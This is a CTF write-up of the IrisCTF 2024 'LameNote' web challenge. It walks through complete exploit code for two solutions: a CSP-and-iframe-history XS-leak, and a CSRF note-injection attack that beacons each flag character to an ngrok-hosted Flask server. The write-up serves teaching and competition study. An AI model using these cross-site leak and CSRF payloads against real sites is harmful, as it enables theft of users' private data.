---
title: LameNote
date: 2024-01-08
tags: 
- web
- xs-leak
- author-hartmannsyg
categories: IrisCTF 2024
---

written by {% person hartmannsyg %}

This was one of the web challenges in IrisCTF 2024, I spent quite a while trying it during the CTF (I was unsuccessful) and also spent quite some time understanding it after the CTF. Thanks to everyone who helped answer my (many) questions in the IrisCTF discord lol.

Also tomato said "If you are done understanding it can you make a writeup for it" so here we are.

The challenge is as follows:
- submit a URL
- admin bot will create a note with a flag in it at https://lamenote-web.chal.irisc.tf/
- it will then visit your url, and your website has to steal the flag, somehow

The site also has a search functionality, and if there is only one note, it will directly display the note. If there are none it simply says "No notes". Otherwise, it will simply give you a list. When the site is directly displaying the note (as there is only one note that fits the query), an image will be requested. This differentiation is quite important for the solution.

We also know that the flag matches `irisctf{[a-z_]+}` so our charlist is only `_abcdefgihkjlmnopqrstuvwxyz`

## "Intended Solution" by sera

sera has given us the solve html:

```html
<!DOCTYPE html>
<html>
<head>
</head>
<body>
    <script>
    (async function(){
    async function go(body) {
      let url = "https://lamenote-web.chal.irisc.tf/search?query=irisctf{" + body

      f = document.createElement('iframe')
      f.setAttribute('sandbox', 'allow-same-origin');
      f.setAttribute('csp', 'img-src \'none\';')
      f.src = url;
      let rCount = 0;
      f.onload = () => {
          rCount += 1;
          // change location after onload once
          setTimeout(() => {
              f.onload = null
              f.src = url;
          }, 100)
      }
      document.body.appendChild(f)
      await new Promise(r => setTimeout(r, 1000));
      f.remove();
      f.src = 'https://blah.ngrok-free.app/csp';
      document.body.appendChild(f)
      await new Promise(r => setTimeout(r, 100));
      let ll = f.contentWindow.history.length;
      document.body.innerHTML = "";
      return ll;
    }
    let known = "";
    const urlParams = new URLSearchParams(window.location.search);
    if(urlParams.get("known") !== null) known = urlParams.get("known");
    let l = await go("!"); // start
    console.log("start", l);
    for(let c of '_abcdefgihkjlmnopqrstuvwxyz}') {
      let l2 = await go(known + c);
      console.log(l2, l, known, c);
      fetch("/?log=" + l2 + "|" + l + "|" + known + "|" + c);
      if(l2 == l) {
        known += c;
        l = l2;
        fetch("/?log=" + known);
        break;
      };
      l = l2;
    }
      if(!known.endsWith("}")) {
        window.open("/?known=" + known);
        window.close();
        while(1) {
          await new Promise(r => setTimeout(r, 1000));
          console.log("idle");
        }
      }
    })();
    </script>
</body>
</html>
```

I *really* did not understand what was going on here so I'll unpack what I've known:

### using `img-src 'none'` to create a navigation binary

{% ccb lang:html gutter1:1-20 highlight:9 %}
<!DOCTYPE html>
<html>
<body>
    <script>
    (async function(){
    async function go(url) {
        f = document.createElement('iframe')
        f.setAttribute('sandbox', 'allow-same-origin');
        f.setAttribute('csp', "img-src 'none';")
        f.src = url; // go to the site
        document.body.appendChild(f)
    }
    // it will return "No notes", will succesfully navigate to page
    await go('https://lamenote-web.chal.irisc.tf/search?query=text_is_not_in_any_note') 
    // it will return the note with the flag, except that HAS AN IMAGE, so it will not successfully navigate
    await go('https://lamenote-web.chal.irisc.tf/search?query=irisctf') 
    })()
    </script>
</body>
</html>
{% endccb %}

(we wrap everything in `(async function(){ ... })()` to run the code asynchronously)

The `go(url)` function creates an iframe and goes to the specified url. However, due to the specified csp of `img-src 'none'`, it is unable to navigate to the page. This is because the page's csp is **weaker** than the iframe's csp, so the site is unable to render

So the idea now is that we can guess character by character, and when it fails we know it is the correct one:

{% ccb html:true %}
/search?query=irisctf{<span class="subst">a</span> ✅ Navigation Successful
/search?query=irisctf{<span class="subst">b</span> ✅ Navigation Successful
/search?query=irisctf{<span class="subst">c</span> ✅ Navigation Successful
...
/search?query=irisctf{<span class="subst">p</span> ❌ Navigation Unsuccessful, note with 'irisctf{p' exists
/search?query=irisctf{p<span class="subst">a</span> ✅ Navigation Successful
/search?query=irisctf{p<span class="subst">b</span> ✅ Navigation Successful
/search?query=irisctf{p<span class="subst">c</span> ✅ Navigation Successful
...
/search?query=irisctf{p<span class="subst">l</span> ❌ Navigation Unsuccessful, note with 'irisctf{pl' exists
{% endccb %}

### xs-leak via navigation

(xs-leak stands for Cross-site leak)

Here is a [relevant page](https://xsleaks.dev/docs/attacks/navigations/) regarding this exploit.

We have a method for *finding* the flag, as long as we can tell the difference between a **successful** navigation and an **unsuccessful** one.

In the navigation xs-leak, we see that we can deduce whether or no the navigation is successful by looking at the iframe's history via `contentWindow.history.length;`. However, this only works when the `src` is the origin (i.e. `http://0.tcp.ap.ngrok.io:11568/`, which is there our site is hosted), so we redirect the iframe back to our site:

{% ccb lang:html gutter1:1-28 diff_add:13-19 %}
<!DOCTYPE html>
<html>
<body>
    <script>
    (async function(){
    async function go(body) {
      let url = "https://lamenote-web.chal.irisc.tf/search?query=irisctf{" + body
      f = document.createElement('iframe')
      f.setAttribute('sandbox', 'allow-same-origin');
      f.setAttribute('csp', "img-src 'none';")
      f.src = url; // go to the site
      document.body.appendChild(f)
      await new Promise(r => setTimeout(r, 1000)); // sleep 1000ms to wait for it to load 
      f.src = 'http://0.tcp.ap.ngrok.io:11568/solve';
      await new Promise(r => setTimeout(r, 1000)); // sleep 1000ms to wait for it to load 
      let length = f.contentWindow.history.length;
      console.log(`${body} history=${length}`)
      document.body.innerHTML = "";
      return length;
    }
    await go('!')
    await go('a')
    await go('b')
    await go('c')
    })();
    </script>
</body>
</html>
{% endccb %}

However, regardless of whether it errors or not, the history only increments one at a time:

{% ccb %}
! history=13
a history=14
b history=15
c history=16
...
y history=38
z history=39
{% endccb %}

Apparently, the solution to this is to run the iframe twice, like so:

{% ccb lang:html gutter1:1-36 diff_add:12-19 %}
<!DOCTYPE html>
<html>
<body>
    <script>
    (async function(){
    async function go(body) {
      let url = "https://lamenote-web.chal.irisc.tf/search?query=irisctf{" + body
      f = document.createElement('iframe')
      f.setAttribute('sandbox', 'allow-same-origin');
      f.setAttribute('csp', "img-src 'none';")
      f.src = url; // go to the site
      f.onload = () => {
          rCount += 1;
          // change location after onload once
          setTimeout(() => {
              f.onload = null
              f.src = url;
          }, 500)
      }
      document.body.appendChild(f)
      await new Promise(r => setTimeout(r, 1000)); // sleep 1000ms to wait for it to load 
      f.src = 'http://0.tcp.ap.ngrok.io:11568/solve';
      await new Promise(r => setTimeout(r, 1000)); // sleep 1000ms to wait for it to load 
      let length = f.contentWindow.history.length;
      console.log(`${body} history=${length}`)
      document.body.innerHTML = "";
      return length;
    }
    await go('!')
    await go('a')
    await go('b')
    await go('c')
    })();
    </script>
</body>
</html>
{% endccb %}

{% ccb html:true %}
! history=3
a history=5
b history=7
c history=9
d history=<span class="number">10</span> (history length only increased once = navigation failed = flag starts with d)
{% endccb %}

With this, we can basically test for the flag now, but there is one additional improvement that sera's solve script used, which is to *remove and then re-add the iframe to the document*

{% ccb lang:html gutter1:1-38 diff_add:22,24 %}
<!DOCTYPE html>
<html>
<body>
    <script>
    (async function(){
    async function go(body) {
      let url = "https://lamenote-web.chal.irisc.tf/search?query=irisctf{" + body
      f = document.createElement('iframe')
      f.setAttribute('sandbox', 'allow-same-origin');
      f.setAttribute('csp', "img-src 'none';")
      f.src = url; // go to the site
      f.onload = () => {
          rCount += 1;
          // change location after onload once
          setTimeout(() => {
              f.onload = null
              f.src = url;
          }, 100)
      }
      document.body.appendChild(f)
      await new Promise(r => setTimeout(r, 1000)); // sleep 1000ms to wait for it to load 
      f.remove();
      f.src = 'http://0.tcp.ap.ngrok.io:11568/solve';
      document.body.appendChild(f)
      await new Promise(r => setTimeout(r, 1000)); // sleep 1000ms to wait for it to load 
      let length = f.contentWindow.history.length;
      console.log(`${body} history=${length}`)
      document.body.innerHTML = "";
      return length;
    }
    await go('!')
    await go('a')
    await go('b')
    await go('c')
    })();
    </script>
</body>
</html>
{% endccb %}

What this does is that the `history.length` does not increment *unless* there is an error. Once again I'm not exactly sure why this happens

{% ccb html:true %}
! history=3
a history=3
b history=3
c history=3
d history=<span class="number">4</span> (history length increased = navigation failed = flag starts with d)
{% endccb %}

## Trixter's Solution (CSRF)

{% ccb caption:trixter url:https://discord.com/channels/1051808836593397781/1051819274995515392/1193886755900895322 lang:python %}
from flask import Flask, request
import sys

app = Flask(__name__)

flag_prefix = 'irisctf{'
chars = set('abcdefghijklmnopqrstuvwxyz_}')
ngrok_url = 'https://[...]'
reset_called = False

@app.route("/")
def index():
    return ("""
<!DOCTYPE html>
<html>
    <head>
    </head>
    <body>
        <script>
            const target = 'https://lamenote-web.chal.irisc.tf';
            function createNote(title, text, image) {
                const iframe = document.createElement("iframe");
                iframe.setAttribute("srcdoc", `
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
    <form action="${target}/create" method="POST">
    <input type="hidden" name="title" value="${title}" />
    <input type="hidden" name="text" value="${text}" />
    <input type="hidden" name="image" value="${image}" />
    <input type="submit" value="Submit request" />
    </form>
    <script>
        document.forms[0].submit();
    <\/script>
</body>
</html>
`);
                document.body.appendChild(iframe);
            }

            function searchNote(search) {
                const iframe = document.createElement("iframe");
                iframe.setAttribute("src", `${target}/search?query=${encodeURIComponent(search)}`);
                document.body.appendChild(iframe);
            }

            const prefix = '%s';
            const charset = 'abcdefghijklmnopqrstuvwxyz_}';
            const remote = '%s';
            for(const char of charset) createNote('trixter', prefix + char, `${remote}/leak?char=` + char);

            setTimeout(() => {
                const iframe = document.createElement("iframe");
                iframe.setAttribute("src", `${remote}/reset`);
                iframe.onload = () => {
                    for(const char of charset) searchNote(prefix + char);
                };
                document.body.appendChild(iframe);
            }, 2000);
        </script>
    </body>
</html>
""" % (flag_prefix, ngrok_url)).strip()

@app.route("/reset")
def reset():
    global reset_called

    reset_called = True
    return "reset triggered"

@app.before_request
def leak():
    global reset_called, chars, flag_prefix

    if request.method == "OPTIONS" and reset_called:
        char = request.args.get("char", "")
        if char in chars:
            print('Flag does not have %s' % char)
            chars.remove(char)

            if len(chars) == 1:
                flag_prefix += list(chars).pop()
                print('Flag Prefix:', flag_prefix)

                reset_called = False
                chars = set('abcdefghijklmnopqrstuvwxyz_')

        return ""
{% endccb %}

What this does is more "straightforward"(?):
- create an iframe for each possible character
- each iframe creates a note with **the image being our `/leak?char=` url** and the contents being:
{% ccb %}
irisctf{a
irisctf{b
irisctf{c
irisctf{d
...
{% endccb %}
- we then query all of them. If the character is **wrong**, there will only be one note displayed, and it will attempt to fetch **our `/leak?char=` url as an image**. However, if the character is **correct**, there will be 2 results: the **actual flag note** and **the one we injected**. This means **our `/leak?char=` url will not be fetched**
{% ccb html:true %}
/search?query=irisctf{<span class="subst">a</span> ✅ /leak?char=a
/search?query=irisctf{<span class="subst">b</span> ✅ /leak?char=b
/search?query=irisctf{<span class="subst">c</span> ✅ /leak?char=c
...
/search?query=irisctf{<span class="subst">p</span> ❌ no /leak?char=<span class="subst">p</span>, another note with 'irisctf{p' exists, this is the correct one
/search?query=irisctf{p<span class="subst">a</span> ✅ /leak?char=a
/search?query=irisctf{p<span class="subst">b</span> ✅ /leak?char=b
/search?query=irisctf{p<span class="subst">c</span> ✅ /leak?char=c
...
/search?query=irisctf{p<span class="subst">l</span> ❌ no /leak?char=<span class="subst">l</span>, another note with 'irisctf{pl' exists, this is the correct one
{% endccb %}